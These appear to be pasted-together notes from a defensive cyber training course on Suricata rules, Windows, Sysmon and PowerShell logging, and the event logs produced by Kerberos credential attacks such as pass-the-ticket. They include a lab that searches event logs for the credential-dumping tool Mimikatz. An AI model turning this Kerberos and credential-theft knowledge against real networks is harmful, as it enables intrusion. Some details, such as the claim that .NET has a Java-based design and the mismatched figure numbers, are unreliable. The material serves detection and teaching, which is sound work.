Analysts can use Jupyter notebooks to analyze logs and events through interactive Python scripts. While there are plenty of pre-built scripts publicly available, analysts can also create their own set of scripts and use them in any environment they wish, with Jupyter Notebooks. Any existing scripts can be uploaded to a running instance of Jupyter Notebooks and used to analyze the logs that are ingested. This is helpful if a CPT wishes to view data from a different perspective or if they wish to document any findings for future use. This is also useful when a log aggregator and indexing solution, like Elastic, is not available.

﻿

Suricata Rules ﻿

A new installation of Suricata comes with an existing ruleset that can be updated regularly. However, the rules or signatures often need to be crafted for a specific environment. Users configure rules in the Suricata configuration file suricata.yaml. The default path for this file is /etc/suricata/suricata.yaml.

﻿

A Suricata ruleset consists of the following:

Action. Determines what happens when the signature matches.

Header. Defines the protocol, IP addresses, ports, and direction of the rule.

Rule options. Defines the specifics of the rule.

The following are valid actions for a ruleset:

alert generates an alert.

pass stops further inspection of the packet.

drop drops the packet and generates an alert.

reject or rejectsrc sends Reset (RST)/ICMP unreachable error to the sender of the packet.

rejectdst sends RST/ICMP error packet to the receiver of the packet.

rejectboth sends RST/ICMP error packets to both sides of the conversation.

The header breaks down into multiple different sections such as protocol, IP address, port, and the direction of the rule. The header protocol tells Suricata which protocol it is concerned with. Analysts may choose from four basic protocols:

tcp

udp

icmp

ip (stands for 'all' or 'any,' in this context)

There are also multiple application layer protocols that can be used, but these are only available if they are enabled in the Suricata configuration file suricata.yaml. For example, for a signature with an http protocol, Suricata ensures that the signature only matches HTTP traffic.

﻿

Other valid actions for a ruleset concern the source or destination of the traffic. These may consist of a single IP address or an IP address range. These can also be combined with the following operators:

../.. specifies an entire IP subnet using Classless Inter-Domain Routing (CIDR) notation.

! excludes or negates an IP address.

[.., ..] groups together multiple IP addresses.

As an example of a combination from the above list, grouping with an IP address range that negates a single IP address is written as [172.0.0.0/24, !172.0.0.10].

﻿

The next set of valid actions for a ruleset concerns ports. In a ruleset, the source port comes first, followed by the destination port. There are special operators for setting ports, similar to the above with IP addresses:

: indicates a range of ports.

! negates a port or ports.

[.., ..] groups together multiple ports.

The following is an example of port actions in a ruleset. A CPT may only want their rule to pertain to ports 80 and 81, but not port 82. The action for this is as written as [80, 81, !82].

﻿

The final valid action for a signature concerns the direction. This tells the signature which way it has to match. Nearly every signature has an arrow to the right (->) to indicate that only packets with this same direction can match. This is written as source -> destination.

﻿

However, it is also possible to have a rule match both ways (<>). This is written as source <> destination.

﻿

Rule Options﻿

﻿

The rest of the rule consists of options that must be written in a specific order. Changing the order changes the meaning of the rule. Rule options are enclosed by parentheses and separated by semicolons. The following is an example of a complete rule option:

alert http any any -> any any (content:"index.php"; http_uri; sid:1;) ﻿

Options always have at least one keyword, however not all options have settings. Options such as content have settings that are specified by the keyword of the option. These are written as the keyword, followed by a colon and the settings, as in : . The example above includes two keywords. The first is the keyword content with the setting "index.php". The second keyword is sid with the setting 1.

﻿

Options such as http_uri do not have settings. These options are simply written with their keywords followed by a semicolon, as in the example of http_uri in the complete rule option, above.

﻿

Some keyword functions act as modifiers. The two types of modifiers are content modifiers and sticky buffers.

﻿

A content modifier looks back in the rule. In the previous example of the complete rule option, the pattern "index.php" is modified to inspect the HTTP uri buffer. This example is repeated below:

alert http any any -> any any (content:"index.php"; http_uri; sid:1;) ﻿

A sticky buffer places the buffer name first. All keywords that follow it apply to that buffer. In the following example, the pattern "403 Forbidden" is inspected against the HTTP response line because it follows the keyword http_response_line:

alert http any any -> any any (http_response_line; content:"403 Forbidden"; sid:1;) The following is an example of a full signature that comprises options with and without settings, as well as modifiers:

alert dns 172.0.0.0/24 any -> $EXTERNAL_NET 53 (msg: "GMAIL PHISHING DETECTED"; dns_query; content:"gmail.com"; nocase; isdataat:1, relative; sid:2000; rev:1;) ﻿ Windows Logging Basics What Are Windows Event Logs? ﻿

Windows event logs are logs that are stored in the proprietary data format evtx. While these logs are not tamper-proof, they are difficult to modify. This means attackers typically either leave the logs or delete all of them, leaving only a log stating that the event logs were cleared.

﻿

Depending on the version of Windows, the default location for event logs is C:\WINDOWS\system32\config or C:\WINDOWS\system32\winevt. However, analysts can configure this location through the command wevtutil. This command can be used to view, export, archive, and clear Windows event logs.﻿﻿

﻿

Windows Event Log Categories ﻿

Windows auditing is broken into several major categories or “channels”. Figure

2.5-1 lists each channel, the systems they concern, and their purpose.

﻿

﻿

Figure 2.5-1﻿

﻿

A system that only comprises a workstation has three main auditing categories: Application, System, and Security. Five categories are available for a Domain Controller (DC) and all seven categories are available when it also hosts a Domain Name System (DNS).

﻿

Each log has different event types, as illustrated in Figure 2.5-2:

﻿

﻿

Figure 2.5-2﻿

﻿

Auditing Policy ﻿

Event logs are customizable since the system needs to be configured to audit specific things. An audit policy can range from broad to specific, spanning a series of categories and subcategories. The policy may enable all categories or focus on only certain subcategories. An audit policy may even include different configurations based on the user.

﻿

The attachment for this task card, available on the right-side panel, presents these categories and their subcategories. The subcategories take precedence over the categories they are grouped under. If there is a conflict in the policy, the subcategory-based policy is enabled.

﻿

The command auditpol displays the categories and subcategories using the Windows command line. To list all subcategories, enter the following command:

auditpol /list /subcategory:* ﻿

The following command lists the current policy:

auditpol /get /category:* ﻿

Enabling a Specific Policy to Log a Specific Event ﻿

The following scenario is an example of when an analyst may need to enable a specific policy to allow a specific event to be logged.

﻿

Scenario

﻿

Threat actors use Security Identifier (SID) history injection to manipulate user tokens in a Windows enterprise network environment. SID history supports account migration from one domain to another while retaining previous permissions. The injection attack works by informing an account that the user had access to something from an old domain and should still have access, but also requires domain administrator permissions.

In this scenario, an analyst looks up the Microsoft documentation and discovers that Event ID 4765 SID History was added to an account was logged when this technique was executed. The Microsoft documentation for this event labels the subcategory as Audit User Account Management. To enable this log, the analyst must enable this subcategory.

﻿

Use the following command to enable this policy:

auditpol /set /Category:"User Account Management" /success:enable ﻿

Summary ﻿

Windows event logs are stored in a proprietary file format evtx. They are located on the hard disk as a file and can be manipulated with the command wevtutil. The events that get logged are set by the audit policy, which analysts can manipulate on the command line with the command auditpol. Analysts can easily determine what settings to enable for a specific event log by referencing Microsoft documentation.

﻿Windows Logging Options Configuring a robust logging solution comprises more than just configuring the subcategories in the audit policy. There are several powerful ways to get more robust logging out of a Windows system. These ways also allow more effective log tuning to produce the data sources required to help analysts identify threat actors. The next few sections of this lesson introduce the logging options available in the following tools:

Native Windows Sysmon PowerShell specific options Native Windows Logging Configuration Options ﻿

The security backbone of a Windows network starts with the native Windows logging options. The temptation is to enable all logging options, however excessive logging has additional costs that hamper proper defense. There are two locations on a system that allow malware to persist after a reboot. These are the file system and the registry.

﻿

File System Logging ﻿

File system changes create logs with the Event ID 4663: An attempt was made to access an object. This requires the following subcategories to be enabled:

Audit File System Audit Kernel Object Audit Registry Audit Removable Storage Registry Logging ﻿

The registry houses Windows configuration information and a significant amount of forensic data. Hundreds, if not thousands, of registry changes happen every minute. While logging registry changes create useful data, they create as much, if not more, unusable data.

﻿

Registry changes create the following event IDs:

4663: An attempt was made to access an object 4657: A registry value was modified

Sysmon Logging Options Sysmon is a Windows system service and device driver that augments the Windows event logging abilities. Its name is an amalgamation of system and monitor. Sysmon has the potential to create an excessive amount of logs, but this can be configured to meet analyst needs.

﻿

Sysmon is capable of producing only the events listed below. However, these events have been developed to compensate for shortcomings found with the native logging capabilities. Even though Sysmon has been purposely designed to augment native logging, not every event is equally significant. Below are the events supported by Sysmon version 13.33, which was released February 2, 2022.

﻿

Sysmon Events Event ID 1: Process creation

Event ID 2: A process changed a file creation time

Event ID 3: Network connection

Event ID 4: Sysmon service state changed

Event ID 5: Process terminated

Event ID 6: Driver loaded

Event ID 7: Image loaded

Event ID 8: CreateRemoteThread

Event ID 9: RawAccessRead

Event ID 10: ProcessAccess

Event ID 11: FileCreate

Event ID 12: RegistryEvent (Object create and delete)

Event ID 13: RegistryEvent (Value Set)

Event ID 14: RegistryEvent (Key and Value Rename)

Event ID 15: FileCreateStreamHash

Event ID 16: ServiceConfigurationChange

Event ID 17: PipeEvent (Pipe Created)

Event ID 18: PipeEvent (Pipe Connected)

Event ID 19: WmiEvent (WmiEventFilter activity detected)

Event ID 20: WmiEvent (WmiEventConsumer activity detected)

Event ID 21: WmiEvent (WmiEventConsumerToFilter activity detected)

Event ID 22: DNSEvent (DNS query)

Event ID 23: FileDelete (File Delete archived)

Event ID 24: ClipboardChange (New content in the clipboard)

Event ID 25: ProcessTampering (Process image change)

Event ID 26: FileDeleteDetected (File Delete logged)

Some of the events listed create massive amounts of data. For example, Event ID 1: Process creation logs every process that opens on a system, good or bad. It is up to the analyst to configure Sysmon to tune and reduce the logging for these sorts of events.

﻿

Ten of the listed Sysmon events overlap with native Windows event logs. In these cases, it is up to the organization to decide whether the added data from Sysmon is worth the additional storage, tuning, and processing power required to conduct meaningful work with the data.

﻿

For example, Sysmon Event ID 1 has a similar role as the Windows Security Event ID 4688: A new process has been created. Figure 2.5-3 lists the fields of this Sysmon event and highlights the fields that the Windows event shares.

﻿

﻿

Figure 2.5-3

﻿

Fields such as FileVersion, Description, Product, and Company only provide supplemental information. Other fields, such as CurrentDirectory, provide more important information. If a command has relative jumps in the options, identifying where those jumps start is critical to discovering what information is passed into the process. The field Hashes enables virus scanning and hash-based signature creation after an attack.

﻿

Recommended Configurations ﻿

The PDF attachment Sysmon Logging Options provides a table with several different categories of recommendations for a Sysmon configuration. This figure includes any Windows event IDs that overlap with the listed Sysmon IDs. The table provides notes for each event type, as well as how much noise the event generates. The final column provides examples of offensive tactics from the MITRE ATT&CK® framework that the Sysmon event is expected to log. The recommendations in the table are explained in more detail below.

﻿

Critical ﻿

The following events should be enabled because they each have unique advantages and manageable false positives. If the event creates a lot of noise, it would still be possible to configure Sysmon to reduce the noise. In the table, these events are marked with a red icon:

Event ID 1: Process creation

Event ID 2: A process changed a file creation time

Event ID 4: Sysmon service state changed

Event ID 6: Driver loaded

Event ID 7: Image loaded

Event ID 9: RawAccessRead

Event ID 15: FileCreateStreamHash

Event ID 16: ServiceConfigurationChange

Event ID 17: PipeEvent (Pipe Created)

Event ID 18: PipeEvent (Pipe Connected)

Overlapping ﻿

The events marked with a yellow icon in the table are recommendations for events to enable if they’re not already addressed by other systems. Within a production network, these events cause excessive logs that do not provide much benefit. However, in a controlled lab setting, these events are useful for investigations:

Event ID 3: Network connection

Event ID 5: Process terminated

Event ID 22: DNSEvent (DNS query)

In certain situations, analysts can enable these events to bridge a detection gap, such as configuring the DNSEvent category to only log requests to the domains on a DNS blackhole list to get alerts that find the actual host making the request.

﻿

The native Windows Event ID 5156: The Windows Filtering Platform has permitted a connection has significant overlap with the data being logged by Sysmon Event ID 3: Network Connection. Figure 2.5-4 highlights the overlapping fields for each of these data sources:

﻿

﻿

Figure 2.5-4

﻿

The Sysmon fields that do not overlap with the native Windows event log fields do not produce additional, actionable data for an investigation, so they are not significant.

﻿

As another example, Sysmon Event ID 5: Process terminated provides only the process Globally Unique Identifier (GUID) over the equivalent native Windows log. The native logging event 4689: A process has exited provides the process's exit code, which Sysmon does not provide. Figure 2.5-5 lists this comparison between this Sysmon and Windows events details.

﻿

﻿

Figure 2.5-5

﻿

Threat-Specific ﻿

Some Sysmon events should be enabled for specific threats. The table uses a blue icon to identify these items. Each of the following events is best enabled only during very specific situations. They each require effort to tune properly and effectively.

Event ID 8: CreateRemoteThread

Event ID 10: ProcessAccess

Event ID 11: FileCreate

Event ID 12: RegistryEvent (Object create and delete)

Event ID 13: RegistryEvent (Value Set)

Event ID 14: RegistryEvent (Key and Value Rename)

Event ID 19: WmiEvent (WmiEventFilter activity detected)

Event ID 20: WmiEvent (WmiEventConsumer activity detected)

Event ID 21: WmiEvent (WmiEventConsumerToFilter activity detected)

Event ID 23: FileDelete (File Delete archived)

Event ID 24: ClipboardChange (New content in the clipboard)

Event ID 25: ProcessTampering (Process image change)

Event ID 26: FileDeleteDetected (File Delete logged)

Sysmon configurations are either based on "include" or "exclude" parameters. Trying to exclude known-good from the events FileCreate or RegistryEvent is a never-ending and futile battle. However, if there is threat intel that details the name and location of malware that is creating a file on disk, then an "include" rule with known-bad is likely to produce few false positives.

﻿

Extensive Filtering ﻿

The following event logs require extensive filtering. The two ways to filter are by inclusion or by exclusion. Include-based filtering only logs events that are explicitly defined. Exclude-based filtering logs all events.

Event ID 1: Process creation

Event ID 5: Process terminated

Event ID 11: FileCreate

Event ID 12: RegistryEvent (Object create and delete)

Event ID 13: RegistryEvent (Value Set)

Event ID 14: RegistryEvent (Key and Value Rename)

Event ID 22: DNSEvent (DNS query)

Include-based filtering is useful when there are a lot of events happening and only a few places that are of interest. The registry-based events (12, 13, and 14) are good candidates for include-based filtering since a rule can be created to only log changes to known spots in the registry that are of interest to attackers, such as persistence mechanisms. Sysmon Event ID 22: DNSEvent or ID 11: FileCreate are also examples of categories that benefit from inclusion-based filtering since known-bad websites or file names can be included and reduce the number of false positives. The downside of inclusion-based filtering is that malicious traffic events need to be explicitly defined.

﻿

Exclude-based filtering is when the normal events are easy to define. Rules such as process creation and process termination make it easier to define legitimate processes and log everything else. In an enterprise environment, the processes users execute are relatively normal. The downside of exclude-based filtering is that if the exclusion is too broad, then data is missed. Also, filtering that is not broad enough leads to a significant amount of false positives.

﻿

Both log filtering strategies take time to tune for the rules of a specific environment. Even after the system is set up properly, it requires regular maintenance to keep the filters useful.

﻿

SwiftOnSecurity ﻿

SwiftOnSecurity is the social media handle for a computer security expert and industry influencer who pretends to be the singer-songwriter Taylor Swift. As of February 2022, they have over 340K followers. The name was chosen as a playful nod to Taylor Swift's caution with digital security.

﻿

The SwiftOnSecurity security researcher, arguably, has the industry-standard Sysmon configuration available on their GitHub account. The configuration file is about 1200 lines long and has multiple comments throughout. A version of this configuration is attached to this task for reference.

﻿

This configuration provides a starting point for filtering events. Some of the events included in the file are named with the MITRE ATT&CK technique that prompted the creation of the rule. The two main approaches to filtering these events are to either only include known-bad events or to only exclude known-good. The SwiftOnSecurity Sysmon configuration for Event ID 12: Registry event, object create/delete is an excellent example of matching on known-bad.

PowerShell Logging Options PowerShell auditing is incredibly useful for a defender. PowerShell scripts are not normally executed by users, yet are frequently leveraged to execute most Windows exploitation techniques. PowerShell is not just a scripting language, it has the same power as a compiled binary. PowerShell is so integral to Windows exploitations, Microsoft released a patch to add additional logging capabilities in an effort to combat hackers. PowerShell logs contain information regarding PowerShell operations, such as starting and stopping the application, cmdlets used, and files accessed. PowerShell logs may be accessed in a variety of channels, such as directly within a PowerShell session or within the C:\Windows\System32\winevt\Logs directory. PowerShell logging does not work like other native Windows logging categories. It is verbose enough that Sysmon created specific events for PowerShell. Examples of useful Windows Event IDs are as follows:﻿﻿

4688: A new process has been created: New PowerShell commands create the following event when the subcategory Audit Process Creation is configured.

400: Engine state is changed from None to Available: Details when the PowerShell EngineState has started.

800: Pipeline execution details for command line: Write-Host Test: Details the pipeline execution information of a command executed by PowerShell.

Enhanced PowerShell Logging ﻿

Although Microsoft designed PowerShell as a useful tool for administrators, it became a prized tool for hackers, as well. PowerShell works on the Microsoft .NET framework, which borrows its design pattern from the programming language Java. The Java language design minimizes compile times and allows software to work on various types of processors. This makes PowerShell more than just a command-line administration tool. The Java-based design of the .NET framework enables PowerShell to have the exact same capabilities of compiled software, but without requiring a binary on the system.

﻿

The hacking world rapidly adopted PowerShell-based exploitation techniques due to these capabilities. Microsoft responded by adding enhanced PowerShell logging features. Windows 10 has enhanced PowerShell logging natively. Older versions of Windows may need updates to provide enhanced PowerShell logging. This layered approach means that the configuration of PowerShell logging is non-conventional and is not configured the same as other logging. The enhanced PowerShell logging introduced in 2015 has three configurable logging capabilities:

Module logging

Script block logging

Transcription logging

Module Logging ﻿

PowerShell Module Logging records the commands executed and portions of the scripts, but does not deobfuscate all code. This means attackers can create code that is intentionally obscure and confusing. To enable module logging, make the following changes to the registry:

HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging EnableModuleLogging = 1 ﻿

This enables logging for the following Event ID:

4103: Executing Pipeline

﻿

Script Block Logging ﻿

Script block logging logs PowerShell scripts as they are executing within the PowerShell engine. This deobfuscates any PowerShell scripts. Prior to this feature, attackers would create scripts that appeared either benign or unintelligible, then the script would change itself just prior to execution. With script block logging enabled, the entire script is logged after it is processed. This shows the deobfuscated code to defenders. To enable script block logging, make the following changes to the registry:

HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging EnableScriptBlockLogging = 1 ﻿

This enables logging for the following Event ID:

4104: Execute a Remote Command

﻿

Transcription Logging ﻿

Transcription logging makes a record for every PowerShell session, including all input and output with timestamps. This is displayed at the command line terminal. To enable transcription logging, make the following changes to the registry:

HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription
EnableInvocationHeader = 1 EnableTranscripting = 1 OutputDirectory = <path_to_directory> ﻿

This enables logging of the shell's transcript to the configured output directory.

Best Event Logs to Monitor Defense is a filtering game, and the first detection is the most difficult. The decision of what is important for logging needs to be based on what battles can be easily won, given the available defender resources. An organization with many defensive analysts combing through their logs is more capable of investigating false positive alerts. On the other hand, an organization with only a few defenders needs to have a signature set that produces fewer false positives.

﻿

Because most organizations have limited resources, it is important to pinpoint the best event logs to monitor for a given network. The “perfect” logs to monitor are the exact logs that the attacker is creating. However, when “perfect” is not available, the following list provides logging configurations that are likely to be useful in today’s environment:

Legally required events

PowerShell events

Credential usage

Rare or unlikely events

Understanding the rationality of these configurations prepares defenders to better assess the options and opportunities unique to their organizations.

﻿

Legally Required Events ﻿

Depending on the organization, there may be various required security configurations. Government networks commonly must comply with Security Technical Implementation Guide (STIG) requirements. Although STIG requirements are not a tailored fit for every organization’s threat landscape, they provide a decent starting point. They are also mandatory.

﻿

PowerShell Events ﻿

PowerShell-based tools are the easiest way to move laterally as well as have an easy, portable post-exploitation toolkit. Some of the most advanced techniques are now found as PowerShell scripts on various public blogs and GitHub repositories. As an attacker, public availability to these advanced techniques is great for two reasons. First, the techniques tend to work in most places. Second, it is difficult to determine who the attacker may be because open-source tools and techniques are available to everyone.

﻿

Credential Usage ﻿

Credentials are the inexpensive and easy way to access information by design. An offensive cyber campaign nearly always uses stolen credentials in some form. Defenders are often able to gather contextual information on users during deep, stateful searches of credential usage. Many reasons exist for a file to be on a system, but there are few reasons for someone’s account to log in when that person is scheduled to be on vacation.

﻿

Rare or Unlikely Events ﻿

Many defense organizations block every indicator of a threat group. Most of these indicators do not intimidate attackers because they are not usually aware of the blocks. Indicators of Compromise (IOC), such as file names, file hashes, domain names, and Internet Protocol (IP) addresses, are all easily changed.

﻿

For example, in the early 2010s, the Air Force would receive threat intelligence information that would include the attacker’s commonly used redirectors. Attackers would mask where they were coming from by redirecting through a third party. It was a constant battle to prevent leadership from blocking that IP address. Imagine a hacker trying to connect to a target system from the other side of the planet but the disposable redirector not working on the first try. It is easy for the attacker to use a different redirector in this case. At the same time, the Air Force would have made a rule for that address because it would be rare to find legitimate traffic from that host.

﻿

Another example is an organization that may not see any reasonable business case for people working late. The organization creates time-based alerts for off-hours access to file systems. The organization may also consider disabling access after a certain time. However, it is just as easy to steal data during business hours as it is after business hours, which makes this measure ineffective. The only change from cutting off access would be in making detection more difficult.

Logging Options Summary Logging too much is just as debilitating as not logging enough. Defenders need to manage a fine balance between these extremes to employ an optimal logging setup. The right setup allows defenders to obtain information that enables them to discover and thwart offensive attacks.

Kerberos Logging Kerberos Review ﻿

Kerberos is a domain authentication protocol that is commonly used within Windows domains. The two functions of Kerberos is to authenticate the user, then grant tickets based on permissions. A previous lesson explored Kerberos in greater detail.

﻿

Figure 2.5-6 illustrates the three typical steps to authenticate and request access to a service using Kerberos. The steps are as follows:

Request and Receive TGT: A user authenticates by requesting a ticket-granting-ticket (TGT) from the Domain Controller (DC) which acts as the Key Distribution Center (KDC).

Request and Receive Service Ticket: User requests access to a resource by requesting a Service Ticket, referred to as a Ticket Granting Service (TGS).

Request Access to Resource: User requests the resource from the Application Service by sending the TGS.

﻿

﻿

Figure 2.5-6

﻿

Expected Kerberos Logs ﻿

Each step of the Kerberos protocol is expected to create specific logs during normal operation. Recognizing which logs are expected helps defenders discern normal activity from unusual and possibly malicious activity. Each logging event listed below occurs in the DC.

﻿

Step 1: Request and Receive TGT ﻿

Requesting the TGT (AS_REQ) ﻿

The aim of the first step in the protocol, as illustrated in Figure 2.5-7, is for the user’s workstation to obtain the TGT by sending the DC an Authentication Service Request (AS_REQ). The default setup for a domain requires pre-authentication. Pre-authentication requires the AS_REQ to have a timestamp encrypted by the user's password. When the DC receives the TGT request, it verifies the timestamp with its own time to ensure that it is a valid time within the past few minutes. This is why, if the time is off on a workstation, it may not be able to authenticate to the domain. The DC returns the TGT, which includes additional session information that is encrypted with the user's password.

﻿

﻿

Figure 2.5-7

﻿

Disabling pre-authentication allows anyone to request a TGT for any user. The TGT response reveals that the session key used for the next step is encrypted by the user's password hash.

﻿

Expected Logging

Event ID: 4768, A Kerberos authentication ticket (TGT) was requested.

Event Type: Failure, if the request fails.

Receiving the TGT (AS_REP) ﻿

For Kerberos to grant tickets based on permissions, Windows adds a Privilege Attribute Certificate (PAC) to the TGT. In Linux environments, this field is blank. The PAC includes the user's IDs as well as group memberships. This section is signed by the domain's Kerberos account on the DC: krbtgt.

﻿

Expected Logging

Event ID: 4768, A Kerberos authentication ticket (TGT) was requested.

Event Type: Success, when a TGT is returned.

Step 2: Request and Receive Service Ticket ﻿

Requesting the TGS (TGS_REQ) ﻿

After the TGT is issued, the user is authenticated to the domain. To gain access to a resource within the domain, the user's account needs to request a service ticket. This request requires the session key that was encrypted by the user's password hash from the previous step, as well as the TGT. Figure 2.5-8 illustrates this step.

﻿

﻿

Figure 2.5-8

﻿

Expected Logging

Event ID: 4769, A Kerberos service ticket was requested.

Event Type: Failure, when a TGS request fails.

Receiving the TGS (TGS_REP) ﻿

The TGS includes a new session key for the service which is encrypted by the previous session key. The TGS is encrypted with the application server key so that it can be presented to the application service, in the next step, with the username and timestamp encrypted by the new session key.

﻿

Expected Logging

Event ID: 4769, A Kerberos service ticket was requested.

Event Type: Success, when a TGS is returned.

Event ID: 4770, A Kerberos service ticket was renewed.

Event Type: Only successful when the TGS is renewed.

Step 3: Request Access to the Resource ﻿

The final step, as illustrated in Figure 2.5-9, is the user's workstation presenting the TGS from step two to the application server for the resource. This step includes optional mutual authentication and an optional PAC check. The PAC check is discussed below.

﻿

﻿

Figure 2.5-9

﻿

Checking the PAC (optional) ﻿

Going back and having the application server verify the PAC sounds foolproof, but there are several important caveats that do not prevent any Kerberos-based attacks at this point.

﻿

Make the following changes to the registry to enable this option:

HKLM/SYSTEM/CurrentControlSetControl/Lsa/KerberosParameters/ ValidateKdcPacSignature = 1 ﻿

This option appears to provide no additional security. It is unclear the exact circumstances when Windows enforces PAC checking. Windows released a confusing statement about PAC checking in an official blog post describing the conditions when Windows would not check the PAC. What is clear is the only exploit that has manipulated a PAC was patched in 2014. Even with that patch removed and PAC checking enabled, security researchers have demonstrated successfully exploiting a DC with the silver ticket attack.

Kerberos Attack Logging The chart provided in the PDF attachment for this task presents the most common and famous Kerberos attacks. The chart lists the attacker requirements for each attack and the logs generated. The logs are identified by color in the following way:

Green indicates useful logs that can be easily filtered and searched for.

Blue indicates logs that appear similar to non-malicious logs and do not necessarily require action.

Yellow indicates logs that require greater context to find malicious activity.

This lesson discusses two attack techniques from this chart, in greater depth. These are “Pass-the-Ticket” and “Overpass-the-Hash”, which is also known as “Pass-the-Key (PTK)”. These techniques are not patchable and are likely to be seen in a contested Windows environment.

﻿

Pass-the-Ticket ﻿

This attack works when the attacker retrieves the TGT from memory on the local workstation with a tool such as Mimikatz. After the attacker obtains the TGT, the attacker can use it from the same system or a different system to request a TGS and gain access to a resource protected by Kerberos. The attacker simply injects the captured ticket into their own session.

﻿

This technique is very similar to the attack, “Pass-the-Hash”, where the attacker takes the credentials from memory. The main difference is that the default validity of a TGT is 10 hours, while the actual credentials last until the user changes their password. Renewing the ticket makes the TGT last for a longer period of time, beyond the default of seven days.

﻿

Logs associated with this technique are relatively normal and expected. However, if the TGT is used or renewed on a different system, then a difference exists in the field Client Address, between the TGT- and TGS-related event logs.

﻿

This attack provides the following logs on the DC:

Event ID: 4768, A Kerberos authentication ticket (TGT) was requested.

Field Client Address is the normal user's system.

Event ID: 4769, A Kerberos service ticket was requested.

Field Client Address is the system the attacker is using the TGT on.

Event ID: 4770, A Kerberos service ticket was renewed.

Field Client Address is the system the attacker is using the TGT on.

On the host, there is a discrepancy between the name on the ticket being used and the name on the logged-in user. It is possible to use PowerShell to grab the logon IDs and compare them to the username on the ticket being used.

﻿

Overpass-the-Hash/PTK ﻿

This attack behaves like a combination of the attacks “Pass-the-Ticket” and “Pass-the-Hash”. The user credentials are stolen from memory, then used to get a TGT, followed by a TGS.

﻿

The hashed user's password is found on the workstation in either active memory or on disk in the Security Account Manager (SAM) hive of the registry. On a DC, the hash is also found in the file NTDS.DIT.

﻿

This attack provides the following logs on the system getting its hash stolen from memory:

Event ID: 4648, A logon was attempted using explicit credentials.

Event ID: 4624, An account was successfully logged on.

Field Logon type is "9 NewCredentials".

Field Logon process is "Seclogo".

Event ID: 4672, Special privileges assigned to new logon.

Field Client Address is the system the attacker is using the TGT on.

This attack also provides these logs on the system on which the credentials are being used:

Event ID: 4624, An account was successfully logged on.

Field Logon type is "3 Network".

Field Logon process is "Kerberos".

Field Authentication Package is "Kerberos".

Event ID: 4672, Special privileges assigned to new logon.

This attack also has logs on the DC:

Event ID: 4768, A Kerberos authentication ticket (TGT) was requested.

Event ID: 4769, A Kerberos service ticket was requested.

Which activity is an indicator of a PTK attack?
A system has requested a TGS without requesting a TGT.

Open PowerShell as an Administrator.

Change the working directory to the trainee's desktop by entering the following command: PS C:\Windows\system32> cd C:\Users\trainee\Desktop

NOTE: If the PowerShell terminal does not have administrative privileges, some log sources are not searchable by the executed commands. These privileges are necessary for this lab.

Declare the start time Mar 2, 2022 @ 16:00:00 as a variable by entering the following command: PS C:\Users\trainee\Desktop> $start = "2022-03-02 4:00:00 PM"

Declare the end time Mar 2, 2022 @ 16:20:00 as a variable by entering the following command: PS C:\Users\trainee\Desktop> $end = "2022-03-02 4:20:00 PM"

Search for Windows PowerShell commands that happened between the selected times from the Windows_PowerShell.evtx file by entering the following command: PS C:\Users\trainee\Desktop> Get-WinEvent -FilterHashTable @{path="Windows_PowerShell.evtx"; StartTime=$start; EndTime=$end}

The results, as displayed in Figure 7.5-20, are similar to viewing the logs Windows_PowerShell in the Event Viewer window. While the cmdlet Get-WinEvent has the option for -path, it is not compatible with the option FilterHashTable. The path needs to be specified as a key-value pair inside of a hash table object, as displayed in Figure 2.5-20.

Search for mimikatz across the Windows PowerShell log by entering the following command: PS C:\Users\trainee\Desktop> Get-WinEvent -FilterHashTable @{path="Windows_PowerShell.evtx"; StartTime=$start; EndTime=$end} | Where-Object {$_.Message -Match ".mimikatz."}
The final set of curly brackets in the command in Step 7 uses the notation $_ to declare a temporary variable for the item in the list. This means the function Where-Object is iterating over each item in the list and putting its value into that temporary variable.

In this context the function Where-Object filters the results based on where the data is that matches the regular expression.

Search for mimikatz across all the event logs by entering the following command: PS C:\Users\trainee\Desktop> Get-WinEvent -FilterHashTable @{path="*.evtx"; StartTime=$start; EndTime=$end} | Where-Object {$_.Message -Match ".mimikatz."}
The command in Step 6 uses "glob" shell expansion within the path variable path="*.evtx" to specify all the saved event logs. Its output is displayed in Figure 2.5-21.

edit signa rules

Reconnaissance Overview There are two types of reconnaissance adversaries may conduct as part of their attack campaigns: active and passive. Each type has its advantages and disadvantages for both adversaries and defenders, alike.

﻿

Active Reconnaissance ﻿

Active reconnaissance requires the adversary to be actively hands-on in the network, searching for any and all hosts, devices, and useful information. Active reconnaissance TTPs can be highly effective, but typically leave artifacts, or evidence, on the target network. Adversaries can employ tools such as Network Mapper (Nmap) or port scan to obtain Internet Protocol (IP) addresses and ports available on the network. However, a significant drawback to active reconnaissance is the amount of activity and noise it creates on the network. Analysts can identify and detect this type of activity by monitoring the network. Due to the evidence that remains after the activity, active reconnaissance is the only TTP that is detectable and can be hunted in a live environment.

﻿

Passive Reconnaissance ﻿

Adversaries use passive reconnaissance TTPs to discover network or host information that does not require sending communications to or through the network. Passive reconnaissance is much harder to detect than active reconnaissance. This is because passive reconnaissance lacks network-related communications or probes for defenders to track through network monitoring systems.

﻿

Adversaries may use host-related commands that return cached communications or network sniffers as part of their passive techniques. Adversaries employing passive reconnaissance commonly conduct packet sniffing through tools such as Wireshark. A packet sniffer returns communication information from, to, and between networks. An adversary needs to have a foothold in a network to enable packet sniffing. To detect packet sniffing in a live environment, analysts review host logs collected by an Endpoint Detection and Response (EDR) solution. The logs contain connection details, such as IP addresses and bytes communicated, which allow analysts to identify anomalous and suspicious activity. Other passive reconnaissance techniques include using host-based tools that return cached information about the network, like the command arp, which returns the addresses of hosts that have been recently viewed and stored in a cache.

Reconnaissance TTPs Adversaries have a wide variety of options to conduct both active and passive reconnaissance of a target network. Adversaries employ TTPS outlined and described in the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework when conducting reconnaissance to gather information about the target network. Common reconnaissance TTPs include the following, as presented in Figure 3.1-1, below:

﻿

﻿

Figure 3.1-1

﻿

Active Scanning ﻿

Adversaries conduct active scanning by searching the target network using the current traffic on it. This hands-on approach to reconnaissance typically involves sending communications to reachable hosts on the network. The hosts then return communications that provide information. The information returned typically pertains to IP addresses and other information that adversaries use to assess network design and infrastructure.

﻿

Phishing for Information ﻿

